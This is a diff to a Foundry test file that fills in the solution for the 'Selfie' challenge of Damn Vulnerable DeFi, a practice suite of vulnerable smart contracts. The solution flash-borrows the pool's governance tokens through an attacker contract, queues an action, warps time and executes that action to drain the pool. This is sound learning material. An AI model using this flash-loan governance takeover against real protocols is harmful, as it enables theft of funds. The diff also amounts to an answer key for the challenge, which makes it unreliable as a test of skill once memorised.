@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrowerImpl} from "../../src/selfie/IERC3156FlashBorrowerImpl.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,16 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        IERC3156FlashBorrowerImpl attacker = new IERC3156FlashBorrowerImpl(governance, recovery);
+
+        pool.flashLoan(
+            attacker, // not used
+            address(token),
+            TOKENS_IN_POOL,
+            ""
+        );
+        vm.warp(block.timestamp + governance.getActionDelay() + 1);
+        governance.executeAction(1);
     }
 
     /**
